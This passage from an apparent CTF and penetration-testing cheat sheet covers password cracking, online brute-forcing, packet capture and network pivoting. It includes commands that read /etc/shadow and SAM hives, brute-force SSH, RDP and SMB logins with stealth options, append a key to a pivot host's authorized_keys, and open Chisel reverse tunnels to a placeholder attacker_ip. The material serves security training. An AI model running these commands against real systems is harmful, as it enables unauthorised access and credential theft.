- **Living off the land binaries (LOLBins)** - Windows equivalent of GTFOBins using native Windows binaries
- **Advanced persistence mechanisms** - Rootkits, bootloaders, and firmware-level persistence

---

### Credential Attacks

#### Hashcat

**Primary Use**: GPU-accelerated password hash cracking supporting 300+ hash algorithms.

**Installation & Verification**

```bash
# Pre-installed on Kali, verify version
hashcat --version

# Update if needed
sudo apt update && sudo apt install hashcat
```

**Hash Type Identification**

```bash
# Identify hash type
hashcat --example-hashes | grep -i "md5"
hashcat hash.txt --identify

# Common hash mode numbers
# 0 = MD5
# 100 = SHA1
# 1000 = NTLM
# 1800 = sha512crypt
# 3200 = bcrypt
# 13100 = Kerberos 5 TGS-REP
```

**Attack Modes**

_Dictionary Attack (Mode 0)_

```bash
# Basic dictionary attack
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# With rules
hashcat -m 0 -a 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Multiple hash files
hashcat -m 1000 ntlm_hashes.txt rockyou.txt --username
```

_Combination Attack (Mode 1)_

```bash
# Combine two wordlists
hashcat -m 0 -a 1 hash.txt wordlist1.txt wordlist2.txt
```

_Brute-Force Attack (Mode 3)_

```bash
# Mask attack - 8 char lowercase
hashcat -m 0 -a 3 hash.txt ?l?l?l?l?l?l?l?l

# Charset definitions
# ?l = lowercase (abcd...xyz)
# ?u = uppercase (ABCD...XYZ)
# ?d = digits (0123456789)
# ?s = special chars
# ?a = all chars

# Complex mask: Password + 2 digits
hashcat -m 0 -a 3 hash.txt ?u?l?l?l?l?l?l?l?d?d

# Custom charset
hashcat -m 0 -a 3 hash.txt -1 ?l?d ?1?1?1?1?1?1?1?1
```

_Hybrid Attacks (Modes 6 & 7)_

```bash
# Dictionary + mask (append)
hashcat -m 0 -a 6 hash.txt rockyou.txt ?d?d?d?d

# Mask + dictionary (prepend)
hashcat -m 0 -a 7 hash.txt ?d?d?d?d rockyou.txt
```

**Performance Optimization**

```bash
# Workload profile (1=low, 2=default, 3=high, 4=nightmare)
hashcat -m 0 -a 0 hash.txt rockyou.txt -w 3

# Specify GPU device
hashcat -m 0 -a 0 hash.txt rockyou.txt -d 1

# Show benchmark
hashcat -b

# Optimize for specific GPU
hashcat -m 0 -a 0 hash.txt rockyou.txt -O
```

**Session Management**

```bash
# Create named session
hashcat -m 0 -a 0 hash.txt rockyou.txt --session mysession

# Restore session
hashcat --session mysession --restore

# Monitor progress
watch -n 1 "hashcat --session mysession --status"
```

**Output Handling**

```bash
# Show cracked passwords
hashcat -m 0 hash.txt --show

# Output to file
hashcat -m 0 -a 0 hash.txt rockyou.txt -o cracked.txt

# Output format (username:hash:password)
hashcat -m 0 hash.txt --show --outfile-format 2
```

**Advanced Techniques**

```bash
# Potfile manipulation (cache of cracked hashes)
hashcat -m 0 hash.txt --show --potfile-path custom.potfile

# Disable potfile
hashcat -m 0 -a 0 hash.txt rockyou.txt --potfile-disable

# Remove found hashes from list
hashcat -m 0 hash.txt --show --left

# Increment mode (try shorter passwords first)
hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a --increment --increment-min 4
```

---

#### John the Ripper

**Primary Use**: CPU-based password cracker with extensive format support and intelligent rule generation.

**Installation & Setup**

```bash
# Verify installation
john --version

# Install jumbo version for extended formats
sudo apt install john

# Locate installation
which john
ls /usr/share/john/
```

**Hash Format Detection**

```bash
# Automatic format detection
john hash.txt

# List supported formats
john --list=formats | grep -i "ntlm"

# Test format
john --format=Raw-MD5 --test
```

**Basic Cracking Operations**

_Dictionary Attack_

```bash
# Simple dictionary attack
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Specify format
john --format=Raw-MD5 --wordlist=rockyou.txt hash.txt

# With custom rules
john --wordlist=rockyou.txt --rules=Single hash.txt
```

_Incremental Mode (Brute-Force)_

```bash
# Default incremental mode
john --incremental hash.txt

# Specific charset
john --incremental=Digits hash.txt
john --incremental=Alpha hash.txt
john --incremental=LowerNum hash.txt

# Custom incremental mode (edit /etc/john/john.conf)
john --incremental=Custom hash.txt
```

_Single Crack Mode_

```bash
# Uses GECOS and username info
john --single hash.txt

# Requires proper format: username:hash
```

**Rule-Based Attacks**

```bash
# Available rule sets
john --list=rules

# Apply specific rule
john --wordlist=rockyou.txt --rules=Jumbo hash.txt
john --wordlist=rockyou.txt --rules=NT hash.txt

# Custom rule syntax examples in john.conf
# Az"2020" = append 2020
# c = capitalize first letter
# d = duplicate word
# l = lowercase all
# u = uppercase all
```

**Hash Extraction for Common Services**

_Linux Shadow Files_

```bash
# Unshadow (combine passwd + shadow)
unshadow /etc/passwd /etc/shadow > unshadowed.txt
john unshadowed.txt
```

_Windows SAM Files_

```bash
# From SAM/SYSTEM registry hives
samdump2 SYSTEM SAM > sam_hashes.txt
john --format=NT sam_hashes.txt
```

_SSH Keys_

```bash
# Convert SSH key to John format
ssh2john id_rsa > ssh_hash.txt
john ssh_hash.txt
```

_ZIP Files_

```bash
zip2john encrypted.zip > zip_hash.txt
john zip_hash.txt
```

_RAR Files_

```bash
rar2john encrypted.rar > rar_hash.txt
john rar_hash.txt
```

_PDF Files_

```bash
pdf2john encrypted.pdf > pdf_hash.txt
john pdf_hash.txt
```

_KeePass Databases_

```bash
keepass2john database.kdbx > keepass_hash.txt
john keepass_hash.txt
```

**Session Management**

```bash
# Show cracked passwords
john --show hash.txt
john --show --format=NT hash.txt

# Restore interrupted session
john --restore

# Status of running session
john --status
```

**Performance & Configuration**

```bash
# Fork multiple processes
john --fork=4 hash.txt

# Custom configuration file
john --config=custom.conf hash.txt

# Set max length
john --max-len=8 hash.txt

# Set min length
john --min-len=6 hash.txt
```

**Output Manipulation**

```bash
# Show only usernames
john --show hash.txt | cut -d: -f1

# Show hash type
john --list=format-details | grep -i "md5"

# Verbose mode
john --wordlist=rockyou.txt hash.txt --verbosity=5
```

---

#### Hydra

**Primary Use**: Network protocol brute-force tool supporting 50+ protocols for online credential attacks.

**Basic Syntax Structure**

```bash
# General format
hydra [options] [target] [protocol] [attack_parameters]

# Single username/password
hydra -l username -p password target_ip protocol

# Username/password lists
hydra -L users.txt -P passwords.txt target_ip protocol
```

**Common Protocol Attacks**

_SSH_

```bash
# Basic SSH attack
hydra -l root -P rockyou.txt ssh://192.168.1.10

# Custom port
hydra -l admin -P passwords.txt ssh://192.168.1.10:2222

# Multiple users
hydra -L users.txt -P passwords.txt ssh://192.168.1.10 -t 4
```

_FTP_

```bash
# FTP brute-force
hydra -l admin -P passwords.txt ftp://192.168.1.10

# Anonymous FTP test
hydra -l anonymous -p "" ftp://192.168.1.10
```

_HTTP/HTTPS Form-Based Authentication_

```bash
# POST form attack
hydra -l admin -P passwords.txt 192.168.1.10 http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect" -V

# GET form attack
hydra -l admin -P passwords.txt 192.168.1.10 http-get-form "/login:user=^USER^&pass=^PASS^:S=302"

# HTTPS with specific failure string
hydra -l admin -P passwords.txt 192.168.1.10 https-post-form "/admin/login.php:user=^USER^&pwd=^PASS^:F=Login failed" -s 443
```

_HTTP Basic Auth_

```bash
hydra -L users.txt -P passwords.txt 192.168.1.10 http-get /admin/
hydra -l admin -P passwords.txt 192.168.1.10 http-head /protected/
```

_SMB/Windows Shares_

```bash
# SMB brute-force
hydra -l administrator -P passwords.txt smb://192.168.1.10

# Domain authentication
hydra -l DOMAIN\\username -P passwords.txt smb://192.168.1.10
```

_RDP_

```bash
# RDP attack
hydra -l administrator -P passwords.txt rdp://192.168.1.10

# Verbose mode
hydra -l admin -P passwords.txt rdp://192.168.1.10 -V
```

_MySQL_

```bash
hydra -l root -P passwords.txt mysql://192.168.1.10

# Specific database
hydra -l dbuser -P passwords.txt mysql://192.168.1.10/database_name
```

_PostgreSQL_

```bash
hydra -l postgres -P passwords.txt postgres://192.168.1.10
```

_MSSQL_

```bash
hydra -l sa -P passwords.txt mssql://192.168.1.10
```

_Telnet_

```bash
hydra -l admin -P passwords.txt telnet://192.168.1.10
```

_VNC_

```bash
hydra -P passwords.txt vnc://192.168.1.10
```

**Performance Options**

```bash
# Tasks (parallel connections)
hydra -l admin -P passwords.txt ssh://192.168.1.10 -t 16

# Timeout per connection
hydra -l admin -P passwords.txt ssh://192.168.1.10 -w 30

# Wait between attempts
hydra -l admin -P passwords.txt ssh://192.168.1.10 -c 5
```

**Output & Logging**

```bash
# Verbose output
hydra -l admin -P passwords.txt ssh://192.168.1.10 -V

# Debug mode
hydra -l admin -P passwords.txt ssh://192.168.1.10 -d

# Output to file
hydra -l admin -P passwords.txt ssh://192.168.1.10 -o results.txt

# Resume interrupted session
hydra -R
```

**Advanced Techniques**

_Credential Stuffing_

```bash
# Colon-separated format (username:password)
hydra -C credentials.txt ssh://192.168.1.10

# Format of credentials.txt:
# admin:password123
# root:toor
```

_Custom Failure Detection_

```bash
# Success string (S=)
hydra -l admin -P passwords.txt 192.168.1.10 http-post-form "/login:user=^USER^&pass=^PASS^:S=Welcome"

# Failure string (F=)
hydra -l admin -P passwords.txt 192.168.1.10 http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid credentials"
```

_Proxy Support_

```bash
# HTTP proxy
hydra -l admin -P passwords.txt 192.168.1.10 ssh -x 3:http://proxy.example.com:8080

# SOCKS proxy
hydra -l admin -P passwords.txt 192.168.1.10 ssh -x 5:socks://127.0.0.1:9050
```

_Service-Specific Options_

```bash
# HTTP with custom headers
hydra -l admin -P passwords.txt 192.168.1.10 http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect:H=Cookie: session=abc123"

# SSL/TLS version enforcement
hydra -l admin -P passwords.txt 192.168.1.10 -m "TLS1.2" https-post-form "/login:user=^USER^&pass=^PASS^:F=failed"
```

**Rate Limiting & Evasion**

```bash
# Single task (slowest, stealthiest)
hydra -l admin -P passwords.txt ssh://192.168.1.10 -t 1

# Wait 10 seconds between attempts
hydra -l admin -P passwords.txt ssh://192.168.1.10 -W 10

# Exit after first valid credential
hydra -l admin -P passwords.txt ssh://192.168.1.10 -f
```

---

#### Medusa

**Primary Use**: Modular network brute-force tool with parallel testing capabilities, alternative to Hydra.

**Basic Syntax**

```bash
# General format
medusa -h target -u username -p password -M module

# Username list
medusa -h 192.168.1.10 -U users.txt -P passwords.txt -M ssh

# Password list
medusa -h 192.168.1.10 -u admin -P passwords.txt -M ftp
```

**Module Usage**

_List Available Modules_

```bash
# Show all modules
medusa -d

# Module-specific help
medusa -M ssh -q
```

_Common Protocol Modules_

```bash
# SSH
medusa -h 192.168.1.10 -u root -P passwords.txt -M ssh

# FTP
medusa -h 192.168.1.10 -u admin -P passwords.txt -M ftp

# HTTP
medusa -h 192.168.1.10 -u admin -P passwords.txt -M http -m DIR:/admin

# SMB
medusa -h 192.168.1.10 -u administrator -P passwords.txt -M smbnt

# MySQL
medusa -h 192.168.1.10 -u root -P passwords.txt -M mysql

# PostgreSQL
medusa -h 192.168.1.10 -u postgres -P passwords.txt -M postgres

# MSSQL
medusa -h 192.168.1.10 -u sa -P passwords.txt -M mssql

# RDP (NLA disabled)
medusa -h 192.168.1.10 -u administrator -P passwords.txt -M rdp

# Telnet
medusa -h 192.168.1.10 -u admin -P passwords.txt -M telnet

# VNC
medusa -h 192.168.1.10 -P passwords.txt -M vnc
```

**Target Specification**

```bash
# Single host
medusa -h 192.168.1.10 -u admin -P passwords.txt -M ssh

# Multiple hosts from file
medusa -H targets.txt -u admin -P passwords.txt -M ssh

# CIDR range [Inference: likely supported based on common tool patterns]
medusa -h 192.168.1.0/24 -u admin -P passwords.txt -M ssh
```

**Credential Options**

```bash
# Single username and password
medusa -h 192.168.1.10 -u admin -p password123 -M ssh

# Username list, single password
medusa -h 192.168.1.10 -U users.txt -p password123 -M ssh

# Single username, password list
medusa -h 192.168.1.10 -u admin -P passwords.txt -M ssh

# Username and password lists
medusa -h 192.168.1.10 -U users.txt -P passwords.txt -M ssh

# Combo file (user:pass format)
medusa -h 192.168.1.10 -C combos.txt -M ssh
```

**Performance Configuration**

```bash
# Parallel hosts
medusa -H targets.txt -u admin -P passwords.txt -M ssh -t 5

# Parallel users
medusa -h 192.168.1.10 -U users.txt -P passwords.txt -M ssh -T 10

# Parallel passwords
medusa -h 192.168.1.10 -u admin -P passwords.txt -M ssh -t 4

# Retry attempts
medusa -h 192.168.1.10 -u admin -P passwords.txt -M ssh -r 2

# Timeout
medusa -h 192.168.1.10 -u admin -P passwords.txt -M ssh -R 3
```

**Output Options**

```bash
# Verbose output
medusa -h 192.168.1.10 -u admin -P passwords.txt -M ssh -v 6

# Output to file
medusa -h 192.168.1.10 -u admin -P passwords.txt -M ssh -O results.txt

# Resume from file
medusa -Z results.txt
```

**Module-Specific Parameters**

_HTTP Module_

```bash
# Directory path
medusa -h 192.168.1.10 -u admin -P passwords.txt -M http -m DIR:/admin

# Custom method
medusa -h 192.168.1.10 -u admin -P passwords.txt -M http -m DIR:/login -m METHOD:POST

# Form parameters [Inference: based on typical HTTP auth module patterns]
medusa -h 192.168.1.10 -u admin -P passwords.txt -M http -m DIR:/login.php -m FORM:user=^USER^&pass=^PASS^
```

_SMB Module_

```bash
# Domain authentication
medusa -h 192.168.1.10 -u DOMAIN\\username -P passwords.txt -M smbnt

# Share access test
medusa -h 192.168.1.10 -u admin -P passwords.txt -M smbnt -m SHARE:C$
```

_MySQL Module_

```bash
# Specify database
medusa -h 192.168.1.10 -u root -P passwords.txt -M mysql -m DATABASE:mysql
```

**Advanced Options**

```bash
# Stop after first success per host
medusa -h 192.168.1.10 -u admin -P passwords.txt -M ssh -F

# Stop after first success globally
medusa -h 192.168.1.10 -u admin -P passwords.txt -M ssh -f

# Error debugging
medusa -h 192.168.1.10 -u admin -P passwords.txt -M ssh -d

# Unique passwords only
medusa -h 192.168.1.10 -u admin -P passwords.txt -M ssh -e ns
# n = no password
# s = username as password
```

**Comparison: Hydra vs Medusa**

[Inference: Based on documented tool characteristics]

_Hydra Advantages_:

- Broader protocol support (50+ services)
- More active development
- Better documentation
- HTTP form-based authentication flexibility

_Medusa Advantages_:

- Modular architecture
- Better parallel threading control
- Cleaner output formatting
- More granular retry logic

_Performance Considerations_:

- Hydra: Better for single-target, high-speed attacks
- Medusa: Better for multi-target, controlled parallel operations

---

#### Tool Integration Workflow

**Hash Extraction → Cracking Pipeline**

```bash
# 1. Extract hashes from system
unshadow /etc/passwd /etc/shadow > hashes.txt

# 2. Identify hash type
hashcat hashes.txt --identify

# 3. Quick crack with John
john --wordlist=rockyou.txt hashes.txt

# 4. GPU crack remaining with Hashcat
john --show hashes.txt --left > uncracked.txt
hashcat -m 1800 -a 0 uncracked.txt rockyou.txt -w 3

# 5. Use cracked credentials for online attacks
hashcat -m 1800 uncracked.txt --show | cut -d: -f1 > cracked_users.txt
hydra -L cracked_users.txt -P cracked_passwords.txt ssh://target_ip
```

**Online Service Enumeration → Brute-Force**

```bash
# 1. Enumerate valid usernames (example: SMTP)
smtp-user-enum -M VRFY -U users.txt -t 192.168.1.10

# 2. Brute-force with Hydra (fast)
hydra -L valid_users.txt -P passwords.txt ssh://192.168.1.10 -t 4

# 3. Retry with Medusa (controlled)
hydra -L valid_users.txt -P passwords.txt ssh://192.168.1.10 --show | grep "^$" | cut -d: -f1 > remaining_users.txt
medusa -h 192.168.1.10 -U remaining_users.txt -P passwords.txt -M ssh -t 1 -R 5
```

#### Important Subtopics

**Password List Generation**: CeWL, crunch, cupp for custom wordlist creation  
**Hash Identification**: hash-identifier, hashID for unknown hash formats  
**Kerberoasting**: GetNPUsers.py, GetUserSPNs.py for Active Directory attacks  
**NTLM Relay Attacks**: Responder, ntlmrelayx for credential capture  
**Rule Development**: Custom John/Hashcat rules for targeted password patterns

---

### Packet Analysis

#### Wireshark

Wireshark is a graphical network protocol analyzer that captures and displays packet data in real-time and from saved capture files. It provides deep inspection capabilities for network traffic analysis during CTF scenarios, particularly for network segmentation challenges, credential harvesting, and protocol vulnerability exploitation.

##### Installation and Launch

```bash
sudo apt-get install wireshark
sudo wireshark
```

Grant non-root packet capture privileges:

```bash
sudo usermod -aG wireshark $USER
sudo chmod +s /usr/bin/dumpcap
```

##### Core Capture Operations

Start capturing on a specific interface:

```bash
## Capture on eth0
sudo wireshark -i eth0

## Capture on all interfaces
sudo wireshark -i any
```

Set capture filters before capturing (reduces file size and CPU overhead):

```bash
## Capture only TCP traffic on port 80
tcp port 80

## Capture all traffic except DNS queries
not (udp port 53)

## Capture traffic to/from specific IP
host 192.168.1.100

## Capture traffic between two hosts
host 192.168.1.100 and host 192.168.1.1

## Capture all HTTP and HTTPS traffic
tcp port 80 or tcp port 443
```

##### Display Filters

Apply filters after capture to isolate specific traffic:

```bash
## Display only HTTP traffic
http

## Display packets containing specific string
frame contains "password"

## Display TCP handshakes (SYN packets)
tcp.flags.syn==1 and tcp.flags.ack==0

## Display traffic with specific response code
http.response.code==200

## Display failed login attempts
http.response.code==401 or http.response.code==403

## Display traffic from specific source port
tcp.srcport==445

## Display DNS queries and responses
dns

## Display SMB traffic
smb or smb2
```

##### Packet Inspection and Extraction

Examine packet details in the packet detail pane by expanding protocol layers. Follow TCP streams for session reconstruction:

Right-click on packet → Follow → TCP Stream (displays reassembled conversation between client and server)

Export captured objects:

```bash
File → Export Objects → HTTP
File → Export Objects → SMB
File → Export Objects → TFTP
```

This extracts files transferred during the capture session, useful for recovering uploaded/downloaded payloads or sensitive documents.

##### Advanced Dissection Techniques

Decode as different protocol:

Right-click packet → Decode As → [Select Protocol]

Create custom display filters for complex traffic patterns:

```bash
## Multi-condition filter for suspicious activity
(tcp.flags.syn==1 or tcp.flags.reset==1) and ip.dst==192.168.1.50

## Filter for potential data exfiltration
(tcp.dstport==22 or tcp.dstport==443 or tcp.dstport==53) and ip.len > 1000
```

##### Practical CTF Applications

Credential extraction from cleartext protocols:

Capture FTP, Telnet, or HTTP Basic Auth traffic, then use Wireshark's packet detail pane to extract usernames and passwords from the payload.

Protocol fuzzing reconnaissance:

Capture traffic from vulnerable service to identify packet structure, field lengths, and encoding before crafting malformed packets.

Network segmentation mapping:

Analyze ICMP and ARP traffic to identify network topology, routing paths, and hidden hosts communicating across subnets.

---

#### tcpdump

tcpdump is a command-line packet capture tool that provides lightweight, scriptable packet analysis. It operates efficiently on remote systems with limited resources and integrates with automated exploitation pipelines.

##### Installation

```bash
sudo apt-get install tcpdump
```

##### Basic Capture Operations

Capture packets on specific interface:

```bash
## Capture on eth0, default to all packets
sudo tcpdump -i eth0

## Capture on all interfaces
sudo tcpdump -i any

## Listen on loopback (useful for local service analysis)
sudo tcpdump -i lo
```

Specify output file for later analysis:

```bash
## Write capture to file
sudo tcpdump -i eth0 -w capture.pcap

## Write with limited packet count (useful for controlled captures)
sudo tcpdump -i eth0 -w capture.pcap -c 1000

## Set packet size limit
sudo tcpdump -i eth0 -s 65535 -w capture.pcap
```

##### Filtering Syntax

Apply Berkeley Packet Filter (BPF) syntax directly:

```bash
## Capture TCP traffic on port 22
sudo tcpdump -i eth0 'tcp port 22'

## Capture traffic between two hosts
sudo tcpdump -i eth0 'host 192.168.1.100 and host 192.168.1.1'

## Capture all incoming traffic to host
sudo tcpdump -i eth0 'dst 192.168.1.100'

## Capture all outgoing traffic from host
sudo tcpdump -i eth0 'src 192.168.1.100'

## Capture specific protocols
sudo tcpdump -i eth0 'tcp'
sudo tcpdump -i eth0 'udp'
sudo tcpdump -i eth0 'icmp'

## Exclude traffic (useful for ignoring noise)
sudo tcpdump -i eth0 'not port 22'

## Complex filter: capture HTTP traffic except from specific IP
sudo tcpdump -i eth0 'tcp port 80 and not src 192.168.1.50'

## Capture SYN packets (reconnaissance scanning)
sudo tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0'

## Capture packets with payload data
sudo tcpdump -i eth0 'tcp[payloadoffset:] != ""'
```

##### Output Verbosity and Formatting

Control display detail level:

```bash
## Default output (one line per packet)
sudo tcpdump -i eth0

## Verbose output (more protocol details)
sudo tcpdump -v -i eth0

## Very verbose (full packet dissection)
sudo tcpdump -vv -i eth0

## Extra verbose (includes all available data)
sudo tcpdump -vvv -i eth0

## Quiet output (minimal information)
sudo tcpdump -q -i eth0
```

Display absolute sequence numbers instead of relative:

```bash
sudo tcpdump -S -i eth0
```

Print timestamps with microsecond precision:

```bash
sudo tcpdump -ttt -i eth0
```

---

#### tshark

tshark is the command-line version of Wireshark, providing powerful packet analysis and conversion capabilities. It integrates into automated CTF exploitation scripts and processes large capture files efficiently.

##### Installation

```bash
sudo apt-get install tshark
```

Grant packet capture privileges:

```bash
sudo usermod -aG wireshark $USER
sudo chmod +s /usr/bin/dumpcap
```

##### Live Capture and File Processing

Capture packets to file:

```bash
## Basic capture
tshark -i eth0 -w capture.pcap

## Capture with packet limit
tshark -i eth0 -w capture.pcap -c 5000

## Capture with size limit (file rotation)
tshark -i eth0 -w capture.pcap -b filesize:10000
```

Read and analyze saved captures:

```bash
## Display all packets from file
tshark -r capture.pcap

## Apply display filter to saved file
tshark -r capture.pcap -Y 'http'
tshark -r capture.pcap -Y 'tcp.port==443'
```

##### Field Extraction and Export

Extract specific protocol fields:

```bash
## Extract source and destination IPs
tshark -r capture.pcap -T fields -e ip.src -e ip.dst

## Extract HTTP requests
tshark -r capture.pcap -Y 'http.request' -T fields -e http.host -e http.request.uri -e http.request.method

## Extract DNS queries and responses
tshark -r capture.pcap -Y 'dns' -T fields -e dns.qry.name -e dns.resp.type -e dns.a

## Extract credentials from HTTP Basic Auth
tshark -r capture.pcap -Y 'http.authorization' -T fields -e http.authorization

## Extract SMB share names
tshark -r capture.pcap -Y 'smb' -T fields -e smb.path

## Extract FTP credentials
tshark -r capture.pcap -Y 'ftp' -T fields -e ftp.request.command -e ftp.request.arg
```

Export capture in different formats:

```bash
## Export as JSON
tshark -r capture.pcap -T json > output.json

## Export as CSV
tshark -r capture.pcap -T csv > output.csv

## Export as plaintext
tshark -r capture.pcap -T text > output.txt
```

##### Advanced Filtering and Analysis

Apply multiple filter conditions:

```bash
## Capture HTTP traffic with specific response code
tshark -r capture.pcap -Y 'http.response.code==200' -T fields -e ip.src -e http.response.code -e http.content_length

## Identify all TCP connections with data payload
tshark -r capture.pcap -Y 'tcp.payload' -T fields -e ip.src -e ip.dst -e tcp.srcport -e tcp.dstport

## Extract all file transfers
tshark -r capture.pcap -Y 'smb.cmd==0xa2' -T fields -e smb.path -e smb.file_size

## Find failed authentication attempts
tshark -r capture.pcap -Y 'http.response.code==401 or http.response.code==403' -T fields -e ip.src -e http.host -e http.response.code
```

Extract objects from capture (similar to Wireshark):

```bash
## Extract HTTP objects
tshark -r capture.pcap --export-objects http,/tmp/exported_objects/

## Extract SMB objects
tshark -r capture.pcap --export-objects smb,/tmp/exported_objects/
```

##### Statistics and Summary Analysis

Generate protocol statistics:

```bash
## Protocol distribution
tshark -r capture.pcap -q -z io,stat,0

## TCP/UDP port statistics
tshark -r capture.pcap -q -z endpoints,tcp
tshark -r capture.pcap -q -z endpoints,udp

## Conversation statistics
tshark -r capture.pcap -q -z conv,ip
```

Identify top talkers:

```bash
## Show hosts with most traffic
tshark -r capture.pcap -T fields -e ip.src -e ip.dst -e ip.len | awk '{print $1, $2}' | sort | uniq -c | sort -rn | head -20
```

##### Integration with CTF Exploitation

Combine with grep and awk for automated analysis:

```bash
## Extract all unique domains accessed via HTTP
tshark -r capture.pcap -Y 'http' -T fields -e http.host | sort | uniq

## Find all IPs attempting SSH connections
tshark -r capture.pcap -Y 'tcp.port==22' -T fields -e ip.src | sort | uniq

## Extract user-agent strings from HTTP requests
tshark -r capture.pcap -Y 'http.request' -T fields -e http.user_agent | sort | uniq
```

Use tshark output in exploitation pipelines:

```bash
#!/bin/bash
## Extract target IPs from capture and test for vulnerabilities
tshark -r capture.pcap -T fields -e ip.dst | sort | uniq | while read ip; do
    nmap -p 22,80,443 "$ip" >> scan_results.txt
done
```

---

#### Comparative Tool Selection

**Wireshark** is optimal for real-time interactive analysis, visual protocol dissection, and scenarios requiring manual investigation of individual packets. Use when exploring unfamiliar protocols or conducting detailed forensic analysis.

**tcpdump** is optimal for remote captures on limited systems, scripted filtering, and lightweight continuous monitoring. Use in resource-constrained environments or when integrating captures into automated pipelines.

**tshark** is optimal for batch processing large capture files, automated field extraction, and programmatic analysis. Use when extracting specific data from captures or generating statistical reports.

---
### Tunneling/Pivoting

#### Introduction to Pivoting Concepts

Pivoting allows an attacker to use a compromised machine as a proxy to access other networks or hosts that are not directly reachable from the attacker's machine. This is essential in CTF scenarios involving segmented networks, dual-homed hosts, or internal network exploitation.

**Key terminology:**
- **Pivot host**: The compromised machine used as an intermediary
- **Target network**: The network segment you're trying to reach
- **Port forwarding**: Redirecting traffic from one port to another
- **SOCKS proxy**: Protocol that routes packets between client and server through a proxy server
- **Dynamic tunneling**: Creating a SOCKS proxy for flexible routing
- **Local port forwarding**: Forwarding local port to remote destination
- **Remote port forwarding**: Forwarding remote port back to attacker machine

#### SSH Tunneling

SSH provides three primary tunneling mechanisms built into the protocol.

##### Local Port Forwarding

Routes traffic from your local machine through the pivot host to a target.

**Basic syntax:**
```bash
ssh -L [local_port]:[target_host]:[target_port] user@pivot_host
```

**Common usage:**
```bash
## Access internal web server through pivot
ssh -L 8080:192.168.1.100:80 user@pivot.example.com

## Access RDP through pivot
ssh -L 3389:10.10.10.50:3389 user@pivot.example.com

## Multiple forwards in one command
ssh -L 8080:192.168.1.100:80 -L 3389:10.10.10.50:3389 user@pivot.example.com

## Bind to all interfaces (dangerous, use carefully)
ssh -L 0.0.0.0:8080:192.168.1.100:80 user@pivot.example.com
```

**Background execution:**
```bash
## Run in background with no shell
ssh -fN -L 8080:192.168.1.100:80 user@pivot.example.com

## -f: Fork to background
## -N: Do not execute remote command
```

##### Dynamic Port Forwarding (SOCKS Proxy)

Creates a SOCKS proxy on your local machine that routes all traffic through the pivot host.

**Basic syntax:**
```bash
ssh -D [local_port] user@pivot_host
```

**Common usage:**
```bash
## Create SOCKS5 proxy on port 1080
ssh -D 1080 user@pivot.example.com

## Background execution
ssh -fN -D 1080 user@pivot.example.com

## Bind to specific interface
ssh -D 127.0.0.1:1080 user@pivot.example.com
```

**Using with proxychains:**
```bash
## Edit /etc/proxychains4.conf or ~/.proxychains/proxychains.conf
## Add at end of file:
## socks5 127.0.0.1 1080

## Then use proxychains with any tool
proxychains nmap -sT -Pn 192.168.1.0/24
proxychains curl http://192.168.1.100
proxychains firefox
```

##### Remote Port Forwarding

Opens a port on the pivot host that forwards back to your machine or another target.

**Basic syntax:**
```bash
ssh -R [remote_port]:[target_host]:[target_port] user@pivot_host
```

**Common usage:**
```bash
## Expose your local web server to pivot host
ssh -R 8080:127.0.0.1:80 user@pivot.example.com

## Forward from pivot to another internal host
ssh -R 9090:10.10.10.50:80 user@pivot.example.com

## Bind to all interfaces on remote (requires GatewayPorts yes in sshd_config)
ssh -R 0.0.0.0:8080:127.0.0.1:80 user@pivot.example.com
```

##### SSH Configuration Tips

**Keep connections alive:**
```bash
## Add to ~/.ssh/config
Host *
    ServerAliveInterval 60
    ServerAliveCountMax 3
```

**SSH without password prompt (CTF scenarios):**
```bash
## Copy your public key
ssh-copy-id user@pivot.example.com

## Or manually
cat ~/.ssh/id_rsa.pub | ssh user@pivot "mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys"
```

**SSH through jump host:**
```bash
## Direct syntax
ssh -J user@jumphost user@final_target

## With tunneling
ssh -J user@jumphost -D 1080 user@final_target
```

#### Chisel

Chisel is a fast TCP/UDP tunnel over HTTP secured via SSH. Particularly useful when SSH is not available or filtered, as it can tunnel over HTTP/HTTPS.

##### Installation

```bash
## Download latest release
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
gunzip chisel_1.9.1_linux_amd64.gz
chmod +x chisel_1.9.1_linux_amd64
mv chisel_1.9.1_linux_amd64 /usr/local/bin/chisel
```

[Unverified]: Version numbers may change; check the official GitHub repository for current releases.

##### Server Setup

**On attacker machine:**
```bash
## Basic server with SOCKS5 proxy
chisel server --port 8000 --reverse

## With authentication
chisel server --port 8000 --reverse --auth user:password

## Bind to specific IP
chisel server --host 0.0.0.0 --port 8000 --reverse

## Enable verbose logging
chisel server --port 8000 --reverse -v
```

**Parameters:**
- `--port`: Server listening port (default 8080)
- `--reverse`: Allow reverse tunneling
- `--auth`: Username:password authentication
- `--socks5`: Enable SOCKS5 proxy (default with --reverse)
- `-v`: Verbose logging

##### Client Usage

**Remote port forwarding (reverse):**
```bash
## On pivot host - forward pivot's port 8080 to attacker's localhost:80
chisel client attacker_ip:8000 R:8080:127.0.0.1:80

## Forward multiple ports
chisel client attacker_ip:8000 R:8080:127.0.0.1:80 R:3389:192.168.1.50:3389

## Create SOCKS proxy on attacker machine
chisel client attacker_ip:8000 R:socks

## SOCKS proxy on specific port
chisel client attacker_ip:8000 R:1080:socks
```

**Local port forwarding:**
```bash
## On attacker machine - forward local 8080 to target through server
chisel client server_ip:8000 8080:192.168.1.100:80

## Multiple forwards
chisel client server_ip:8000 8080:192.168.1.100:80 3389:192.168.1.100:3389
```

**With authentication:**
```bash
chisel client --auth user:password attacker_ip:8000 R:socks
```

##### Windows Client Usage

```cmd
## Download Windows binary
chisel.exe client attacker_ip:8000 R:socks

## Background execution with PowerShell
Start-Process -NoNewWindow -FilePath "chisel.exe" -ArgumentList "client","attacker_ip:8000","R:socks"
```

##### Chisel Over HTTPS

```bash
## Generate self-signed certificate
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

## Server with TLS
chisel server --port 443 --reverse --tls-key key.pem --tls-cert cert.pem

## Client connection
chisel client https://attacker_ip:443 R:socks --fingerprint <server_fingerprint>
```

